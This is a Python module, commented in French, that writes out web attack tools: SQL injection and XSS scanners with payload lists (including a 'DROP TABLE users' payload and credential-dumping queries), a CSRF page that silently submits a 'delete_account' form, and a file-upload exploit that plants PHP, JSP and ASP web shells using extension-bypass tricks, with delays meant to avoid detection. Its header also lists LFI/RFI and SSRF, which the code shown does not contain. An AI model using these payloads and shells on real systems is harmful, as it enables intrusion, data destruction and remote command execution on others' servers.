#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
üåê WEB EXPLOITATION - Module d'exploitation web avanc√©e
SQL Injection, XSS, CSRF, File Upload, LFI/RFI, SSRF
"""

import os
import subprocess
import threading
import time
import json
import requests
import urllib.parse
import re
from datetime import datetime

class WebExploitation:
    def __init__(self):
        self.web_exploits = []
        self.active_exploits = []
        
    def sql_injection_scanner(self, target_url, injection_points):
        """Scanner d'injection SQL avanc√©"""
        print(f"üíâ Scan injection SQL: {target_url}")
        
        try:
            exploit_dir = "web_exploits"
            os.makedirs(exploit_dir, exist_ok=True)
            
            exploit_name = f"sql_injection_{int(time.time())}"
            exploit_file = os.path.join(exploit_dir, f"{exploit_name}.py")
            
            # Payloads SQL injection
            sql_payloads = [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "'; DROP TABLE users--",
                "' OR 1=1#",
                "' OR 1=1--",
                "admin'--",
                "admin'#",
                "admin'/*",
                "' UNION SELECT username,password FROM users--",
                "' UNION SELECT @@version--",
                "' UNION SELECT database()--",
                "' UNION SELECT user()--",
                "' UNION SELECT schema_name FROM information_schema.schemata--"
            ]
            
            exploit_code = f'''#!/usr/bin/env python3
import requests
import urllib.parse
import re
import time

class SQLInjectionScanner:
    def __init__(self):
        self.target_url = "{target_url}"
        self.injection_points = {injection_points}
        self.payloads = {sql_payloads}
        self.results = []
        
    def test_injection(self, url, param, payload):
        """Teste une injection SQL"""
        try:
            # Encoder le payload
            encoded_payload = urllib.parse.quote(payload)
            
            # Construire l'URL avec le payload
            test_url = url.replace(f"{{param}}=", f"{{param}}={{encoded_payload}}")
            
            # Envoyer la requ√™te
            response = requests.get(test_url, timeout=10)
            
            # Analyser la r√©ponse
            if self.detect_sql_error(response.text):
                return {{
                    'url': test_url,
                    'param': param,
                    'payload': payload,
                    'response_length': len(response.text),
                    'status_code': response.status_code,
                    'vulnerable': True
                }}
                
        except Exception as e:
            print(f"[-] Erreur test injection: {{e}}")
            
        return None
        
    def detect_sql_error(self, response_text):
        """D√©tecte les erreurs SQL dans la r√©ponse"""
        sql_errors = [
            'sql syntax',
            'mysql_fetch',
            'oracle error',
            'postgresql error',
            'sql server error',
            'microsoft ole db',
            'mysql_num_rows',
            'mysql_fetch_array',
            'mysql_fetch_object',
            'mysql_fetch_assoc',
            'mysql_fetch_row',
            'mysql_fetch_field',
            'mysql_fetch_lengths',
            'mysql_fetch_all',
            'mysql_fetch_*',
            'mysql_*',
            'oracle_*',
            'postgresql_*',
            'sqlserver_*',
            'mssql_*'
        ]
        
        response_lower = response_text.lower()
        for error in sql_errors:
            if error in response_lower:
                return True
        return False
        
    def scan_target(self):
        """Scanne la cible pour les injections SQL"""
        print(f"[+] Scan injection SQL sur {{self.target_url}}")
        
        for point in self.injection_points:
            print(f"[+] Test du point: {{point}}")
            
            for payload in self.payloads:
                result = self.test_injection(self.target_url, point, payload)
                if result:
                    self.results.append(result)
                    print(f"[+] VULN√âRABLE: {{point}} avec {{payload}}")
                    
                time.sleep(0.5)  # D√©lai pour √©viter la d√©tection
                
        return self.results

if __name__ == "__main__":
    scanner = SQLInjectionScanner()
    results = scanner.scan_target()
    print(f"[+] Scan termin√©: {{len(results)}} vuln√©rabilit√©s trouv√©es")
'''
            
            with open(exploit_file, 'w', encoding='utf-8') as f:
                f.write(exploit_code)
            
            exploit_info = {
                'name': exploit_name,
                'target_url': target_url,
                'file': exploit_file,
                'timestamp': datetime.now().isoformat(),
                'type': 'sql_injection'
            }
            
            self.web_exploits.append(exploit_info)
            print(f"‚úÖ Scanner SQL injection cr√©√©: {exploit_file}")
            return exploit_file
            
        except Exception as e:
            print(f"‚ùå Erreur cr√©ation scanner SQL: {e}")
            return None
    
    def xss_scanner(self, target_url, injection_points):
        """Scanner XSS avanc√©"""
        print(f"üéØ Scan XSS: {target_url}")
        
        try:
            exploit_dir = "web_exploits"
            os.makedirs(exploit_dir, exist_ok=True)
            
            exploit_name = f"xss_scanner_{int(time.time())}"
            exploit_file = os.path.join(exploit_dir, f"{exploit_name}.py")
            
            # Payloads XSS
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onchange=alert('XSS')>",
                "<textarea onblur=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "<details ontoggle=alert('XSS')>",
                "<video onloadstart=alert('XSS')>",
                "<audio oncanplay=alert('XSS')>",
                "<embed src=javascript:alert('XSS')>",
                "<object data=javascript:alert('XSS')>"
            ]
            
            exploit_code = f'''#!/usr/bin/env python3
import requests
import urllib.parse
import re
import time

class XSSScanner:
    def __init__(self):
        self.target_url = "{target_url}"
        self.injection_points = {injection_points}
        self.payloads = {xss_payloads}
        self.results = []
        
    def test_xss(self, url, param, payload):
        """Teste une injection XSS"""
        try:
            # Encoder le payload
            encoded_payload = urllib.parse.quote(payload)
            
            # Construire l'URL avec le payload
            test_url = url.replace(f"{{param}}=", f"{{param}}={{encoded_payload}}")
            
            # Envoyer la requ√™te
            response = requests.get(test_url, timeout=10)
            
            # V√©rifier si le payload est r√©fl√©chi
            if payload in response.text:
                return {{
                    'url': test_url,
                    'param': param,
                    'payload': payload,
                    'reflected': True,
                    'status_code': response.status_code
                }}
                
        except Exception as e:
            print(f"[-] Erreur test XSS: {{e}}")
            
        return None
        
    def scan_target(self):
        """Scanne la cible pour les XSS"""
        print(f"[+] Scan XSS sur {{self.target_url}}")
        
        for point in self.injection_points:
            print(f"[+] Test du point: {{point}}")
            
            for payload in self.payloads:
                result = self.test_xss(self.target_url, point, payload)
                if result:
                    self.results.append(result)
                    print(f"[+] XSS TROUV√â: {{point}} avec {{payload}}")
                    
                time.sleep(0.5)
                
        return self.results

if __name__ == "__main__":
    scanner = XSSScanner()
    results = scanner.scan_target()
    print(f"[+] Scan termin√©: {{len(results)}} XSS trouv√©s")
'''
            
            with open(exploit_file, 'w', encoding='utf-8') as f:
                f.write(exploit_code)
            
            exploit_info = {
                'name': exploit_name,
                'target_url': target_url,
                'file': exploit_file,
                'timestamp': datetime.now().isoformat(),
                'type': 'xss_scanner'
            }
            
            self.web_exploits.append(exploit_info)
            print(f"‚úÖ Scanner XSS cr√©√©: {exploit_file}")
            return exploit_file
            
        except Exception as e:
            print(f"‚ùå Erreur cr√©ation scanner XSS: {e}")
            return None
    
    def csrf_exploit_generator(self, target_url, action_url):
        """G√©n√©rateur d'exploits CSRF"""
        print(f"üîÑ Cr√©ation exploit CSRF: {target_url}")
        
        try:
            exploit_dir = "web_exploits"
            os.makedirs(exploit_dir, exist_ok=True)
            
            exploit_name = f"csrf_exploit_{int(time.time())}"
            exploit_file = os.path.join(exploit_dir, f"{exploit_name}.html")
            
            csrf_payload = f'''<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit</title>
</head>
<body>
    <h1>üéØ CSRF Exploit</h1>
    <p>Cette page tente d'ex√©cuter une action sur: {action_url}</p>
    
    <form id="csrf_form" action="{action_url}" method="POST" style="display:none;">
        <input type="hidden" name="action" value="delete_account">
        <input type="hidden" name="user_id" value="1">
        <input type="hidden" name="confirm" value="yes">
    </form>
    
    <script>
        // Auto-submit apr√®s 3 secondes
        setTimeout(function() {{
            document.getElementById('csrf_form').submit();
        }}, 3000);
        
        // Ou soumettre imm√©diatement
        // document.getElementById('csrf_form').submit();
    </script>
    
    <p>‚è∞ Le formulaire sera soumis automatiquement dans 3 secondes...</p>
</body>
</html>'''
            
            with open(exploit_file, 'w', encoding='utf-8') as f:
                f.write(csrf_payload)
            
            exploit_info = {
                'name': exploit_name,
                'target_url': target_url,
                'action_url': action_url,
                'file': exploit_file,
                'timestamp': datetime.now().isoformat(),
                'type': 'csrf_exploit'
            }
            
            self.web_exploits.append(exploit_info)
            print(f"‚úÖ Exploit CSRF cr√©√©: {exploit_file}")
            return exploit_file
            
        except Exception as e:
            print(f"‚ùå Erreur cr√©ation exploit CSRF: {e}")
            return None
    
    def file_upload_exploit(self, target_url, upload_path):
        """Exploit d'upload de fichiers malveillants"""
        print(f"üìÅ Cr√©ation exploit upload: {target_url}")
        
        try:
            exploit_dir = "web_exploits"
            os.makedirs(exploit_dir, exist_ok=True)
            
            exploit_name = f"file_upload_exploit_{int(time.time())}"
            exploit_file = os.path.join(exploit_dir, f"{exploit_name}.py")
            
            # Shells web malveillants
            php_shell = '''<?php
// Simple PHP Shell
if(isset($_GET['cmd'])) {
    $output = shell_exec($_GET['cmd']);
    echo "<pre>$output</pre>";
}
?>'''
            
            jsp_shell = '''<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>'''
            
            asp_shell = '''<%
Dim oScript
Dim oScriptNet
Dim oFileSys, oFile
Dim szCMD, szTempFile

Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

szCMD = Request.Form("cmd")
szTempFile = "C:\" & oFileSys.GetTempName()
Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile & " 2>&1", 0, True)

Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
Response.Write "Command Output: " & vbCRLF
Response.Write Server.HTMLEncode(oFile.ReadAll)
oFile.Close
Call oFileSys.DeleteFile(szTempFile, True)
%>'''
            
            exploit_code = f'''#!/usr/bin/env python3
import requests
import os
import time

class FileUploadExploit:
    def __init__(self):
        self.target_url = "{target_url}"
        self.upload_path = "{upload_path}"
        
    def create_malicious_files(self):
        """Cr√©e des fichiers malveillants"""
        files = {{
            'php_shell.php': '''{php_shell}''',
            'jsp_shell.jsp': '''{jsp_shell}''',
            'asp_shell.asp': '''{asp_shell}''',
            'shell.php.jpg': '''{php_shell}''',  # Bypass extension
            'shell.php;.jpg': '''{php_shell}''',  # Bypass extension
            'shell.php%00.jpg': '''{php_shell}''',  # Null byte bypass
            'shell.php....': '''{php_shell}''',  # Multiple dots bypass
        }}
        
        for filename, content in files.items():
            with open(filename, 'w') as f:
                f.write(content)
            print(f"[+] Fichier cr√©√©: {{filename}}")
            
        return files
        
    def upload_files(self):
        """Tente d'uploader les fichiers malveillants"""
        files = self.create_malicious_files()
        
        for filename in files.keys():
            try:
                with open(filename, 'rb') as f:
                    files = {{'file': (filename, f, 'application/octet-stream')}}
                    response = requests.post(self.target_url, files=files)
                    
                if response.status_code == 200:
                    print(f"[+] Upload r√©ussi: {{filename}}")
                else:
                    print(f"[-] Upload √©chou√©: {{filename}}")
                    
            except Exception as e:
                print(f"[-] Erreur upload {{filename}}: {{e}}")
                
            time.sleep(1)

if __name__ == "__main__":
    exploit = FileUploadExploit()
    exploit.upload_files()
'''
            
            with open(exploit_file, 'w', encoding='utf-8') as f:
                f.write(exploit_code)
            
            exploit_info = {
                'name': exploit_name,
                'target_url': target_url,
                'upload_path': upload_path,
                'file': exploit_file,
                'timestamp': datetime.now().isoformat(),
                'type': 'file_upload_exploit'
            }
            
            self.web_exploits.append(exploit_info)
            print(f"‚úÖ Exploit upload cr√©√©: {exploit_file}")
            return exploit_file
            
        except Exception as e:
            print(f"‚ùå Erreur cr√©ation exploit upload: {e}")
            return None 